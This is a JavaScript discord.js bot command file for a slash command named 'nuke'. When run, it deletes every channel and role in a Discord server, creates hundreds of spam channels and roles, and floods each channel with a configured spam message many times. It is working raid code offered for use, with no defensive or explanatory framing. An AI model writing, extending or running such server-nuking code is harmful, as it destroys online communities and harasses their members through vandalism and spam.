const { SlashCommandBuilder } = require('discord.js');
const { channel_name } = require('../config.json');
const { role_name } = require('../config.json');
const { spam_message } = require('../config.json');



module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Deletes everything in the server'),
  async execute(interaction) {
    await interaction.deferReply();

    await interaction.guild.channels.cache.forEach(async channel => {
      await channel.delete().catch(error => {
        console.log(`Error: ${error} | Couldn't delete ${channel.name}`)
      })
    });

    await interaction.guild.roles.cache.forEach(async role => {
      await role.delete().catch(error => {
        console.log(`Error: ${error} | Couldn't delete ${role.name}`)
      })
    });

    for (let i = 1; i < 200; i++) {
      await interaction.guild.channels.create({ name: `${channel_name}` }).catch(error => {
        console.log(`Error: ${error}`)
      })
    };

    for (let i = 1; i < 300; i++) {
      await interaction.guild.roles.create({ name: `${role_name}` }).catch(error => {
        console.log(`Error: ${error}`)
      })
    };

    for (let i = 1; i < 100; i++) {
      await interaction.guild.channels.cache.forEach(async channel => {
        await channel.send(spam_message).catch(error => {
          console.log(`Error: ${error} | Couldn't send a message to ${channel.name}`)
        })
      });
    };
  },
};